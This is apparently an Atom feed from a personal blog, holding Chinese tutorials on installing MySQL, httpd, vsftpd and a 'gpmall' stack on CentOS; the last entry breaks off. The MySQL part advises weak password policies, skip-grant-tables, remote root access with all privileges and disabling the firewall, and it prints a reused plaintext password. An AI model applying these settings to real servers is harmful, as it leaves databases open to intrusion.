class="code"><pre><span class="line">mysql -v</span><br><span class="line">systemctl start mysqld</span><br><span class="line">systemctl enable mysqld</span><br><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure><h2 id="查看随机生成的密码"><a href="#查看随机生成的密码" class="headerlink" title="查看随机生成的密码"></a>查看随机生成的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;password&quot; /var/log/mysqld.log</span><br></pre></td></tr></table></figure><h2 id="以root身份进入Mysql"><a href="#以root身份进入Mysql" class="headerlink" title="以root身份进入Mysql"></a>以root身份进入Mysql</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">输入刚刚获取到的密码即可进入</span><br></pre></td></tr></table></figure><h2 id="修改root的Mysql密码"><a href="#修改root的Mysql密码" class="headerlink" title="修改root的Mysql密码"></a>修改root的Mysql密码</h2><blockquote>密码要求大写字母＋小写字母＋数字＋特殊字符，长度不能小于8位</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password BY &#x27;Lun5201314..&#x27;;</span><br></pre></td></tr></table></figure><h2 id="可以将密码修改为简单模式，方便操作-非必要"><a href="#可以将密码修改为简单模式，方便操作-非必要" class="headerlink" title="可以将密码修改为简单模式，方便操作(非必要)"></a>可以将密码修改为简单模式，方便操作(非必要)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置为弱口令,密码最小长度为1</span><br><span class="line">mysql&gt; set global validate_password.policy=0;</span><br><span class="line">mysql&gt; set global validate_password.length=1;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">#查看密码策略</span><br><span class="line">mysql&gt; show variables like &#x27;%validate_password_policy%&#x27;;</span><br><span class="line">mysql&gt; show variables like &#x27;%validate_password_length%&#x27;;</span><br></pre></td></tr></table></figure><h2 id="可以设置免密登录-非必要"><a href="#可以设置免密登录-非必要" class="headerlink" title="可以设置免密登录(非必要)"></a>可以设置免密登录(非必要)</h2><blockquote>修改/etc/my.cnf文件</blockquote><blockquote>把skip-grant-tables添加到配置文件里面，放在[mysqld]下面就可以了</blockquote><blockquote>重启服务systemctl restart mysqld</blockquote><h2 id="可以对Mysql进行安全性配置-非必要"><a href="#可以对Mysql进行安全性配置-非必要" class="headerlink" title="可以对Mysql进行安全性配置(非必要)"></a>可以对Mysql进行安全性配置(非必要)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><blockquote>重置root用户的密码。<p>说明:在输入密码时，系统为了最大限度的保证数据安全，命令行将不做任何回显。您只需要输入正确的密码信息，然后按Enter键即可。<br>Enter password for user root: #输入已获取的root用户初始密码</p><p>The existing password for the user account root has expired. Please set a new password.</p><p>New password: #输入新的MySQL密码</p><p>Re-enter new password: #重复输入新的MySQL密码<br>The ‘validate_password’ component is installed on the server.<br>The subsequent steps will run with the existing configuration<br>of the component.<br>Using existing password for root.<br>Change the password for root ? ((Press y|Y for Yes, any other key for No) :Y #输入Y选择更新MySQL密码。您也可以输入N不再更新MySQL密码。</p><p>New password: #输入新的MySQL密码</p><p>Re-enter new password: #重复输入新的MySQL密码</p><p>Estimated strength of the password: 100<br>Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) :Y #输入Y确认使用已设置的密码。<br>b.删除匿名用户。<br>c.By default, a MySQL installation has an anonymous user,<br>d.allowing anyone to log into MySQL without having to have<br>e.a user account created for them. This is intended only for<br>f.testing, and to make the installation go a bit smoother.<br>g.You should remove them before moving into a production<br>h.environment.<br>i.<br>j.Remove anonymous users? (Press y|Y for Yes, any other key for No) :Y #输入Y删除MySQL默认的匿名用户。<br>Success.<br>k.禁止root账号远程登录。<br>l.Normally, root should only be allowed to connect from<br>m.‘localhost’. This ensures that someone cannot guess at<br>n.the root password from the network.<br>o.<br>p.Disallow root login remotely? (Press y|Y for Yes, any other key for No) :Y #输入Y禁止root远程登录。<br>Success.<br>q.删除test库以及对test库的访问权限。<br>r.By default, MySQL comes with a database named ‘test’ that<br>s.anyone can access. This is also intended only for testing,<br>t.and should be removed before moving into a production<br>u.environment.<br>v.<br>w.<br>x.Remove test database and access to it? (Press y|Y for Yes, any other key for No) :Y #输入Y删除test库以及对test库的访问权限。<br>y. - Dropping test database…<br>z.Success.<br>aa.<br>bb. - Removing privileges on test database…<br>Success.<br>cc.重新加载授权表。<br>dd.Reloading the privilege tables will ensure that all changes<br>ee.made so far will take effect immediately.<br>ff.<br>gg.Reload privilege tables now? (Press y|Y for Yes, any other key for No) :Y #输入Y重新加载授权表。<br>hh.Success.<br>ii.<br>All done!</p></blockquote><h2 id="开启远程连接"><a href="#开启远程连接" class="headerlink" title="开启远程连接"></a>开启远程连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set host =&#x27;%&#x27; where user =&#x27;root&#x27;</span><br></pre></td></tr></table></figure><h2 id="给root用户授权"><a href="#给root用户授权" class="headerlink" title="给root用户授权"></a>给root用户授权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all privileges on *.* to root@&#x27;%&#x27; with grant option;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><h2 id="创建远程登录MySQL的账号"><a href="#创建远程登录MySQL的账号" class="headerlink" title="创建远程登录MySQL的账号"></a>创建远程登录MySQL的账号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建数据库用户2021232203322,并授予远程连接权限</span><br><span class="line">mysql&gt; create user &#x27;2021232203322&#x27;@&#x27;%&#x27; identified by &#x27;Lun5201314..&#x27;; </span><br><span class="line">#为2021232203322用户授权数据库所有权限</span><br><span class="line">mysql&gt; grant all privileges on *.* to &#x27;2021232203322&#x27;@&#x27;%&#x27;; </span><br><span class="line">#刷新权限</span><br><span class="line">mysql&gt; flush privileges; </span><br></pre></td></tr></table></figure><h2 id="CMD-窗口连接使用"><a href="#CMD-窗口连接使用" class="headerlink" title="CMD 窗口连接使用"></a>CMD 窗口连接使用</h2><blockquote>cmd命令行输入mysql -h ip地址 -P 3306 -u 用户名 -p需要关闭防火墙:systemctl stop firewalld<p>如果提示’mysql’ 不是内部或外部命令，也不是可运行的程序,则复制mysql的安装路径bin目录<br>我这里是：C:\Program Files\MySQL\MySQL Server 5.5\bin<br>右击我的电脑-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量-&gt;系统变量-&gt;双击Path-&gt;新建-&gt;把刚刚的目录复制进去-&gt;确定-&gt;外面还有一个确定</p></blockquote><h2 id="Navicat-远程连接使用："><a href="#Navicat-远程连接使用：" class="headerlink" title="Navicat 远程连接使用："></a>Navicat 远程连接使用：</h2><blockquote>连接名随便写，主机：写ip地址，端口3306，用户名为root（前面如果设置了禁止root远程登录则会登陆失败），或者创建的用户，密码为自己设置的密码,同样需要关闭防火墙:systemctl stop firewalld</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot;&gt;&lt;a href=&quot;#检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot; class=&quot;headerlink&quot; title=&quot;检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot;&gt;&lt;/a&gt;检查</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建web服务</title>
    <link href="https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2022-12-11T14:51:03.000Z</published>
    <updated>2022-12-11T15:09:24.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装httpd服务"><a href="#安装httpd服务" class="headerlink" title="安装httpd服务"></a>安装httpd服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install httpd</span><br><span class="line">systemctl enable httpd</span><br><span class="line">vim /var/www/html/index.html</span><br></pre></td></tr></table></figure><blockquote>往index.html里面写内容</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><blockquote>浏览器输入ip地址，即可显示自己制作的index.html页面。</blockquote><blockquote>将网站源码下载放到/var/www/html，即可显示制作好的网页内容。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装httpd服务&quot;&gt;&lt;a href=&quot;#安装httpd服务&quot; class=&quot;headerlink&quot; title=&quot;安装httpd服务&quot;&gt;&lt;/a&gt;安装httpd服务&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>FTP配置-本地用户</title>
    <link href="https://jielunya.github.io/2022/12/09/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/"/>
    <id>https://jielunya.github.io/2022/12/09/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/</id>
    <published>2022-12-09T07:01:39.277Z</published>
    <updated>2022-12-09T07:33:49.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y vsftpd</span><br><span class="line">systemctl enable vsftpd.service</span><br><span class="line">systemctl start vsftpd.service</span><br><span class="line">netstat -antup | grep ftp</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/1.png"></p><h2 id="添加FTP用户并修改密码"><a href="#添加FTP用户并修改密码" class="headerlink" title="添加FTP用户并修改密码"></a>添加FTP用户并修改密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# adduser ftp22</span><br><span class="line">[root@localhost ~]# passwd ftp22</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/2.png"></p><h2 id="为FTP用户创建文件夹及文件"><a href="#为FTP用户创建文件夹及文件" class="headerlink" title="为FTP用户创建文件夹及文件"></a>为FTP用户创建文件夹及文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir /var/ftp/22</span><br><span class="line">[root@localhost ~]# touch /var/ftp/22/22.txt</span><br></pre></td></tr></table></figure><h2 id="将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户"><a href="#将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户" class="headerlink" title="将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户"></a>将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# chown -R ftp22:ftp22 /var/ftp/22</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl disabled firewalld</span><br></pre></td></tr></table></figure><h2 id="配置vsftpd-conf文件"><a href="#配置vsftpd-conf文件" class="headerlink" title="配置vsftpd.conf文件"></a>配置vsftpd.conf文件</h2><blockquote>vsftpd.conf里面主要包括安全配置，传输，用户还有权限等相关的选项</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure><blockquote>除下面提及的参数，其他参数保持默认值即可。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#修改下列参数的值：</span><br><span class="line">#禁止匿名登录FTP服务器。</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#允许本地用户登录FTP服务器。</span><br><span class="line">local_enable=YES</span><br><span class="line">#监听IPv4 sockets。</span><br><span class="line">listen=YES</span><br><span class="line"></span><br><span class="line">#在行首添加#注释掉以下参数：</span><br><span class="line">#关闭监听IPv6 sockets。</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">#设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/22</span><br><span class="line">#全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">#启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">#指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">#本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=&lt;FTP服务器公网IP地址&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=50000</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=50010</span><br></pre></td></tr></table></figure><blockquote>总配置：</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Example config file /etc/vsftpd/vsftpd.conf</span><br><span class="line">#</span><br><span class="line"># The default compiled in settings are fairly paranoid. This sample file</span><br><span class="line"># loosens things up a bit, to make the ftp daemon more usable.</span><br><span class="line"># Please see vsftpd.conf.5 for all compiled in defaults.</span><br><span class="line">#</span><br><span class="line"># READ THIS: This example file is NOT an exhaustive list of vsftpd options.</span><br><span class="line"># Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd&#x27;s</span><br><span class="line"># capabilities.</span><br><span class="line">#</span><br><span class="line"># Allow anonymous FTP? (Beware - allowed by default if you comment this out).</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#</span><br><span class="line"># Uncomment this to allow local users to log in.</span><br><span class="line"># When SELinux is enforcing check for SE bool ftp_home_dir</span><br><span class="line">local_enable=YES</span><br><span class="line">#</span><br><span class="line"># Uncomment this to enable any form of FTP write command.</span><br><span class="line">write_enable=YES</span><br><span class="line">#</span><br><span class="line"># Default umask for local users is 077. You may wish to change this to 022,</span><br><span class="line"># if your users expect that (022 is used by most other ftpd&#x27;s)</span><br><span class="line">local_umask=022</span><br><span class="line">#</span><br><span class="line"># Uncomment this to allow the anonymous FTP user to upload files. This only</span><br><span class="line"># has an effect if the above global write enable is activated. Also, you will</span><br><span class="line"># obviously need to create a directory writable by the FTP user.</span><br><span class="line"># When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access</span><br><span class="line">#anon_upload_enable=YES</span><br><span class="line">#</span><br><span class="line"># Uncomment this if you want the anonymous FTP user to be able to create</span><br><span class="line"># new directories.</span><br><span class="line">#anon_mkdir_write_enable=YES</span><br><span class="line">#</span><br><span class="line"># Activate directory messages - messages given to remote users when they</span><br><span class="line"># go into a certain directory.</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">#</span><br><span class="line"># Activate logging of uploads/downloads.</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">#</span><br><span class="line"># Make sure PORT transfer connections originate from port 20 (ftp-data).</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">#</span><br><span class="line"># If you want, you can arrange for uploaded anonymous files to be owned by</span><br><span class="line"># a different user. Note! Using &quot;root&quot; for uploaded files is not</span><br><span class="line"># recommended!</span><br><span class="line">#chown_uploads=YES</span><br><span class="line">#chown_username=whoever</span><br><span class="line">#</span><br><span class="line"># You may override where the log file goes if you like. The default is shown</span><br><span class="line"># below.</span><br><span class="line">#xferlog_file=/var/log/xferlog</span><br><span class="line">#</span><br><span class="line"># If you want, you can have your log file in standard ftpd xferlog format.</span><br><span class="line"># Note that the default log file location is /var/log/xferlog in this case.</span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">#</span><br><span class="line"># You may change the default value for timing out an idle session.</span><br><span class="line">#idle_session_timeout=600</span><br><span class="line">#</span><br><span class="line"># You may change the default value for timing out a data connection.</span><br><span class="line">#data_connection_timeout=120</span><br><span class="line">#</span><br><span class="line"># It is recommended that you define on your system a unique user which the</span><br><span class="line"># ftp server can use as a totally isolated and unprivileged user.</span><br><span class="line">#nopriv_user=ftpsecure</span><br><span class="line">#</span><br><span class="line"># Enable this and the server will recognise asynchronous ABOR requests. Not</span><br><span class="line"># recommended for security (the code is non-trivial). Not enabling it,</span><br><span class="line"># however, may confuse older FTP clients.</span><br><span class="line">#async_abor_enable=YES</span><br><span class="line">#</span><br><span class="line"># By default the server will pretend to allow ASCII mode but in fact ignore</span><br><span class="line"># the request. Turn on the below options to have the server actually do ASCII</span><br><span class="line"># mangling on files when in ASCII mode. The vsftpd.conf(5) man page explains</span><br><span class="line"># the behaviour when these options are disabled.</span><br><span class="line"># Beware that on some FTP servers, ASCII support allows a denial of service</span><br><span class="line"># attack (DoS) via the command &quot;SIZE /big/file&quot; in ASCII mode. vsftpd</span><br><span class="line"># predicted this attack and has always been safe, reporting the size of the</span><br><span class="line"># raw file.</span><br><span class="line"># ASCII mangling is a horrible feature of the protocol.</span><br><span class="line">#ascii_upload_enable=YES</span><br><span class="line">#ascii_download_enable=YES</span><br><span class="line">#</span><br><span class="line"># You may fully customise the login banner string:</span><br><span class="line">#ftpd_banner=Welcome to blah FTP service.</span><br><span class="line">#</span><br><span class="line"># You may specify a file of disallowed anonymous e-mail addresses. Apparently</span><br><span class="line"># useful for combatting certain DoS attacks.</span><br><span class="line">#deny_email_enable=YES</span><br><span class="line"># (default follows)</span><br><span class="line">#banned_email_file=/etc/vsftpd/banned_emails</span><br><span class="line">#</span><br><span class="line"># You may specify an explicit list of local users to chroot() to their home</span><br><span class="line"># directory. If chroot_local_user is YES, then this list becomes a list of</span><br><span class="line"># users to NOT chroot().</span><br><span class="line"># (Warning! chroot&#x27;ing can be very dangerous. If using chroot, make sure that</span><br><span class="line"># the user does not have write access to the top level directory within the</span><br><span class="line"># chroot)</span><br><span class="line">#chroot_local_user=YES</span><br><span class="line">#chroot_list_enable=YES</span><br><span class="line"># (default follows)</span><br><span class="line">#chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#</span><br><span class="line"># You may activate the &quot;-R&quot; option to the builtin ls. This is disabled by</span><br><span class="line"># default to avoid remote users being able to cause excessive I/O on large</span><br><span class="line"># sites. However, some broken FTP clients such as &quot;ncftp&quot; and &quot;mirror&quot; assume</span><br><span class="line"># the presence of the &quot;-R&quot; option, so there is a strong case for enabling it.</span><br><span class="line">#ls_recurse_enable=YES</span><br><span class="line">#</span><br><span class="line"># When &quot;listen&quot; directive is enabled, vsftpd runs in standalone mode and</span><br><span class="line"># listens on IPv4 sockets. This directive cannot be used in conjunction</span><br><span class="line"># with the listen_ipv6 directive.</span><br><span class="line">listen=YES</span><br><span class="line">#</span><br><span class="line"># This directive enables listening on IPv6 sockets. By default, listening</span><br><span class="line"># on the IPv6 &quot;any&quot; address (::) will accept connections from both IPv6</span><br><span class="line"># and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6</span><br><span class="line"># sockets. If you want that (perhaps because you want to listen on specific</span><br><span class="line"># addresses) then you must run two copies of vsftpd with two configuration</span><br><span class="line"># files.</span><br><span class="line"># Make sure, that one of the listen options is commented !!</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">userlist_enable=YES</span><br><span class="line">tcp_wrappers=YES</span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">##设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/22</span><br><span class="line">##全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">##启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">##指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">##本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=100.26.28.49</span><br><span class="line">##设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">##建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=50000</span><br><span class="line">##设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=50010</span><br><span class="line">#</span><br></pre></td></tr></table></figure><h2 id="配置例外用户名单"><a href="#配置例外用户名单" class="headerlink" title="配置例外用户名单"></a>配置例外用户名单</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/chroot_list</span><br></pre></td></tr></table></figure><blockquote>添加用户，此处我是ftp22。</blockquote><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/3.png"></p><h2 id="重启vsftpd服务"><a href="#重启vsftpd服务" class="headerlink" title="重启vsftpd服务"></a>重启vsftpd服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart vsftpd.service</span><br></pre></td></tr></table></figure><h2 id="创建文件，测试验证。"><a href="#创建文件，测试验证。" class="headerlink" title="创建文件，测试验证。"></a>创建文件，测试验证。</h2><blockquote>cmd命令行，输入ftp加空格接上对应ip地址，登录ftp。</blockquote><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/4.png"><br><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/5.png"><br><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# touch /var/ftp/22/yjs213-22-pjl.txt</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装vsftpd&quot;&gt;&lt;a href=&quot;#安装vsftpd&quot; class=&quot;headerlink&quot; title=&quot;安装vsftpd&quot;&gt;&lt;/a&gt;安装vsftpd&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>云主机应用部署</title>
    <link href="https://jielunya.github.io/2022/12/08/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/"/>
    <id>https://jielunya.github.io/2022/12/08/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/</id>
    <published>2022-12-08T13:35:27.246Z</published>
    <updated>2022-12-08T13:51:24.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/1.png"><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/2.png"></p><h2 id="网卡配置："><a href="#网卡配置：" class="headerlink" title="网卡配置："></a>网卡配置：</h2><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/3.png"><br>systemcl restart network重启网卡<br>ip addr查看ens33网卡的ip地址<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/4.png"><br>使用Finalshell连接<br>修改主机名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hostnamectl set-hostname gpmall-pjl</span><br><span class="line">[root@localhost ~]# logout</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/5.png"></p><h2 id="修改hosts文件："><a href="#修改hosts文件：" class="headerlink" title="修改hosts文件："></a>修改hosts文件：</h2><p>配置全局变量，在&#x2F;etc&#x2F;hosts文档最后加入如下代码：<br>192.168.200.22 kafka.mall<br>192.168.200.22 mysql.mall<br>192.168.200.22 redis.mall<br>192.168.200.22 zookeeper.mall<br>192.168.200.22 java.mall<br>192.168.200.22 gpmall-pjl<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/6.png"></p><h2 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h2><p>将两个镜像文件放到&#x2F;root下<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/7.png"></p><h3 id="创建挂载点目录"><a href="#创建挂载点目录" class="headerlink" title="创建挂载点目录"></a>创建挂载点目录</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# mkdir /opt/centos</span><br><span class="line">[root@gpmall-pjl ~]# mkdir /opt/paas</span><br><span class="line">挂载镜像</span><br><span class="line">[root@gpmall-pjl ~]# mount -o loop CentOS-7-x86_64-DVD-1804.iso /opt/centos</span><br><span class="line">[root@gpmall-pjl ~]# mount -o loop chinaskills_cloud_pa.iso /opt/paas</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/8.png"></p><h2 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# cd /etc/yum.repos.d/</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# mkdir bak</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# mv *.repo bak</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# vi /etc/yum.repos.d/centos.repo</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/9.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[gpmall]</span><br><span class="line">name=gpmall</span><br><span class="line">baseurl=file:///opt/paas/ChinaskillMall/gpmall-repo/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl opt]# yum clean all</span><br><span class="line">[root@gpmall-pjl opt]# yum repolist</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/10.png"></p><h2 id="安装Java环境"><a href="#安装Java环境" class="headerlink" title="安装Java环境"></a>安装Java环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y java java-devel</span><br><span class="line">[root@gpmall-pjl ~]# java -version</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/11.png"></p><h2 id="安装redis缓存服务"><a href="#安装redis缓存服务" class="headerlink" title="安装redis缓存服务"></a>安装redis缓存服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y redis</span><br></pre></td></tr></table></figure><h2 id="安装Elasticsearch服务"><a href="#安装Elasticsearch服务" class="headerlink" title="安装Elasticsearch服务"></a>安装Elasticsearch服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y elasticsearch</span><br></pre></td></tr></table></figure><h2 id="安装nginx服务"><a href="#安装nginx服务" class="headerlink" title="安装nginx服务"></a>安装nginx服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y nginx</span><br></pre></td></tr></table></figure><h2 id="安装mariadb数据库"><a href="#安装mariadb数据库" class="headerlink" title="安装mariadb数据库"></a>安装mariadb数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y mariadb mariadb-server</span><br></pre></td></tr></table></figure><h2 id="安装zookeeper"><a href="#安装zookeeper" class="headerlink" 